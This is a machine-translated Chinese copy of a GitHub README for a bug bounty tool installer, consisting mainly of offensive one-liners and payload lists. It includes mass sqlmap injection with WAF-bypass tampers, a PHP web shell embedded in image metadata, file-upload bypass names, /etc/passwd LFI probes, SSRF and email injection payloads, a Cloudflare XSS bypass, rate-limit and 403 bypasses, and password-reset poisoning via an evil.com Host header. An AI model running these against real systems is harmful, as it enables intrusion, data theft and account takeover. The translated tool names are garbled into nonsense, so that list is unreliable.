https://github.com/0xJin/awesome-bugbounty-builder

# **很棒的 Bug Bounty Builder ¯\\ *(ツ)* /¯**

**GitHub 分叉** GitHub 许可证 GitHub 星星  
*很棒的 Bug 赏金构建器项目 \- 用于查找漏洞的所有常用工具。*  
在 Debian 上测试。  
![bb][image1]  
---

## **安装：**

$ git clone https://github.com/0xJin/awesome-bugbounty-builder.git  
$ cd awesome-bugbounty-builder/  
$ chmod \+x awesome-bugbounty-build.sh  
$ ./awesome-bugbounty-builder.sh

## **您将在这里找到的工具**

* 聚集  
* 子列表  
* 加乌普鲁斯  
* HTTPX  
* Gf \+ 图案  
* 韓國  
* sqlmap  
* 康密克斯  
* 拓扑图  
* 九头蛇  
* 开膛手约翰  
* 邪恶力量  
* 阿琼  
* 蜘蛛侠  
* NoSQL地图  
* 网络映射  
* 尼克托  
* 氟化氢氟酸  
* 403-绕过  
* 戈布斯特  
* 塞克利斯  
* 哈希标识符  
* 跨平台数据映射  
* 走私者  
* SSRF地图  
* Gmapsapiscanner  
* 替换  
* 外置工具  
* XSRFProbe  
* XXE 漏洞利用者  
* Rust 扫描  
* 低频音频套件  
* 麋鹿  
* 原子核+模板  
* 尿路感染  
* 频率  
* 苏比  
* 开放红迪网  
* 古夫兹  
* 倍增器  
* 模糊查询语言  
* 美分  
* 莉菲  
* SSRF 工具  
* 信息网  
* 高里

---

## **Bug Bounty 提示和工具使用 \+ 单行提示：**

### **FUZZ XSS 的单行*侦察：***

$ amass enum \-brute \-passive \-d example.com | httpx \-silent \-status-code | tee domain.txt  
$ cat domain.txt | gauplus \-random-agent \-t 200 | gf xss | kxss | tee domain2.txt  
$ cat domain.txt | gauplus \-random-agent \-t 200 | gf xss | uro | qsreplace '"\>\<img src=x onerror=prompt('jin');\>' | freq  
---

### ***使用FUFF*** **ONE-LINER对所有子域名进行 FUZZ 处理：**

$ amass enum \-brute \-passive \-d http://example.com | sed 's\#\*.\# \#g' | httpx \-silent \-threads 10 | xargs \-I@ sh \-c 'ffuf \-w wordlist.txt \-u @/FUZZ \-mc 200'  
---

### ***使用FUFF*** **ONE-LINER进行命令注入：**

$ cat subdomains.txt | httpx \-silent \-status-code | gauplus \-random-agent \-t 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” \> fuzzing.txt  
$ ffuf \-ac \-u FUZZ \-w fuzzing.txt \-replay-proxy 127.0.0.1:8080  
// search for ”uid” in burp proxy intercept   
// You can use the same query for search SSTI in qsreplase add "{{7\*7}}" and search on burp for '49'  
---

### **SQL注入技巧：**

// \*\*MASS SQL injection\*\*  
$ amass enum \-brute \-passive \-d example.com | httpx \-silent \-status-code | tee domain.txt  
$ cat domain.txt | gauplus \-random-agent \-t 200 | gf sqli | tee domain2.txt  
$ sqlmap \-m domain2.txt \-dbs \--batch \--random-agent  
$ subfinder \-dL domains.txt | dnsx | waybackurl | uro  | grep "\\?" | head \-20 | httpx \-silent \> urls;sqlmap \-m urls \--batch \--random-agent \--level 1 | tee sqlmap.txt  
// \*\*SQL Injection headers\*\*  
$ sqlmap \-u "http://redacted.com" \--header="X-Forwarded-For: 1\*" \--dbs \--batch \--random-agent \--threads=10  
// \*\*SQL Injection bypass 401\*\*  
$ sqlmap \-u "http://redacted.com" \--dbs \--batch \--random-agent \--forms \--ignore-code=401

// PRO TIPS FOR BYPASSING WAF, add to SQLmap this tamper  
\--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,space2comment,randomcase  
---

### **XSS \+ SQLi \+ CSTI/SSTI**

Payload: '"\>\<svg/onload=prompt(5);\>{{7\*7}}  
---

### **EXIFTOOL \+ 文件上传提示：**

$ exiftool \-Comment="\<?php echo 'Command:'; if($\_POST){system($\_POST\['cmd'\]);} \_\_halt\_compiler();" img.jpg  
// File Upload bypass  
file.php%20  
file.php%0a  
file.php%00  
file.php%0d%0a  
file.php/  
file.php.\\  
file.  
file.php....  
file.pHp5....  
file.png.php  
file.png.pHp5  
file.php%00.png  
file.php\\x00.png  
file.php%0a.png  
file.php%0d%0a.png  
flile.phpJunk123png  
file.png.jpg.php  
file.php%00.png%00.jpg  
---

### **打开重定向提示一行：**

$ export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs \-I % \-P 25 sh \-c 'curl \-Is "%" 2\>&1 | grep \-q "Location: $LHOST" && echo "VULN\! %"'  
---

### **LFI 单行：**

$ gauplus \-random-agent \-t 200 http://redacted.com | gf lfi | qsreplace "/etc/passwd" | xargs \-I% \-P 25 sh \-c 'curl \-s "%" 2\>&1 | grep \-q "root:x" && echo "VULN\! %"'  
$ assetfinder \-subs-only target.com | httpx \-silent \-nc \-p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 \-path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" \-mr "root:x:" \-t 60  
$ cat domains.txt | gauplus \-random-agent \-t 10 | gf lfi | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx \-silent \-nc \-mr "root:x:" \-t 250  
---

### **最佳 SSRF 绕过方法：**

http://127.1/  
http://0000::1:80/  
http://\[::\]:80/  
http://2130706433/  
http://whitelisted@127.0.0.1  
http://0x7f000001/  
http://017700000001  
http://0177.00.00.01

### **使用此工具的最佳 SSRF 技巧：**

$ amass enum \-passive \-brute \-d yahoo.com \-silent | httpx \-silent | tee domains.txt | ssrf-tool \-domains domains.txt \-payloads payloads.txt \-silent=false \-paths=true \-patterns patterns.txt  
$ echo "twitter.com" | gauplus \-random-agent \-t 100 | tee domains.txt; ssrftool \-domains domains.txt \-silent=false \-paths=false \-payloads payloads.txt  
---

### **电子邮件攻击：**

// \*\*Header Injection\*\*  
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com  
"recipient@test.com\>\\r\\nRCPT TO:\<victim+"@test.com  
// \*\*XSS Injection\*\*  
test+(\<script\>alert(0)\</script\>)@example.com  
test@example(\<script\>alert(0)\</script\>).com  
"\<script\>alert(0)\</script\>"@example.com  
// \*\*SST Injection\*\*  
"\<%= 7 \* 7 %\>"@example.com  
test+(${{7\*7}})@example.com  
// \*\*SQL Injection\*\*  
"' OR 1=1 \-- '"@example.com  
"mail'); SLEEP(5);--"@example.com  
// \*\*SSRF Attack\*\*  
john.doe@abc123.burpcollaborator.net  
john.doe@\[127.0.0.1\]  
---

### **图像的 XSS 负载**

\<img src=x onerror=alert('XSS')\>.png  
"\>\<img src=x onerror=alert('XSS')\>.png  
"\>\<svg onmouseover=alert(1)\>.svg  
\<\<script\>alert('xss')\<\!--a--\>a.png  
---

### **使用默认规则绕过 CLOUDFLARE 的 XSS**

"/\>\<svg+svg+svg\\/\\/On+OnLoAd=confirm(1)\>  
---

### **在 javascript 文件中查找隐藏的参数：**

$ amass enum \-passive \-brute \-d redacted.com | gau | egrep \-v '(.css|.svg)' | while read url; do vars=$(curl \-s $url | grep \-Eo "var \[a-zA-Z0-9\]+" | sed \-e 's,'var','"$url"?',g' \-e 's/ //g' | grep \-v '.js' | sed 's/.\*/&=xss/g'); echo \-e "\\e\[1;33m$url\\n\\e\[1;32m$vars"; done  
---

### **IDOR 快速实现账户接管：**

\~Create an account   
\~In the reset field set a password and intercept with burp  
\~GET /user/2099/reset (change to 2098\) send the request  
\~Take the token   
\~Cookie editor and use this token  
\~Reload page  
---

### **对于 API 密钥：**

$ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.

### **使用 GF 工具查找敏感信息：**

$ gauplus redacted.com \-subs | cut \-d"?" \-f1 | grep \-E "\\.js+(?:on|)$" | tee domains.txt  
sort \-u domains.txt | fff \-s 200 \-o out/  
$ for i in \`gf \-list\`; do \[\[ ${i} \=\~ "\_secrets"\* \]\] && gf ${i}; done  
---

### **通过添加以下内容绕过 RATE-LIMIT：**

X-Originating-IP: IP  
X-Forwarded-For: IP  
X-Remote-IP: IP  
X-Remote-Addr: IP  
X-Client-IP: IP  
X-Host: IP  
X-Forwared-Host: IP  
---

### **使用 FFUF 和 GAUPLUS 查找访问令牌：**

$ cat domains.txt | sed 's/https\\?:\\/\\///' | gau \> domains2.txt  
$ cat domains2.txt | grep \-P "\\w+\\.js(\\?|$)" | sort \-u \> jsurls.txt  
$ ffuf \-mc 200 w jsurls.txt:HFUZZ \-u HFUZZ \-replay-proxy http://127.0.0.1:8080  
// Use Scan Check Builder Burp extension, add passive profile to extract “accessToken” or “access\_token”  
// Extract found tokens and validate with https://github.com/streaak/keyhacks  
---

### **查找 CORS 漏洞：**

$ amass enum \-d redacted.com | httpx \-threads 300 \-follow-redirects \-silent | rush \-j200 'curl \-m5 \-s \-I \-H "Origin: evil.com" {} | \[\[ $(grep \-c "evil.com") \-gt 0 \]\] && printf "\\n3\[0;32m\[VUL TO CORS\] 3\[0m{}"' 2\>/dev/null  
---

### **绕过 403 和 401：**

X-Original-URL: /admin  
X-Override-URL: /admin  
X-Rewrite-URL: /admin

---

### **Web缓存欺骗：**

[https://hackerone.com/reports/397508](https://hackerone.com/reports/397508)  
---

### **Web 缓存中毒：**

[https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerability-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)  
---

### **绕过密码中毒来接管帐户：**

// Request  
POST https://target.com/password-reset?user=123 HTTP/1.1  
Host: evil.com

// If you receive a link this works\!

---

### **最佳词汇表：**

https://github.com/six2dez/OneListForAll/releases  
https://github.com/Karanxa/Bug-Bounty-Wordlists

---

## **谢谢**

**![给我买杯咖啡][image2]**  
别忘了在 Twitter 上关注我。  
[@0xJin](https://twitter.com/0xJin) \- 该工具由 0xJin 用❤️制作 ¯\\ *(ツ)* /¯。  


[image1]: https://user-images.githubusercontent.com/81621963/147457586-79ac41eb-f995-455b-a144-f80a5783047a.PNG

[image2]: https://camo.githubusercontent.com/8ca6cbc30815bc3ef458755d26604c424652dc18a51df3b3d708126667c31c91/68747470733a2f2f63646e2e6275796d6561636f666665652e636f6d2f627574746f6e732f76322f64656661756c742d7265642e706e67 
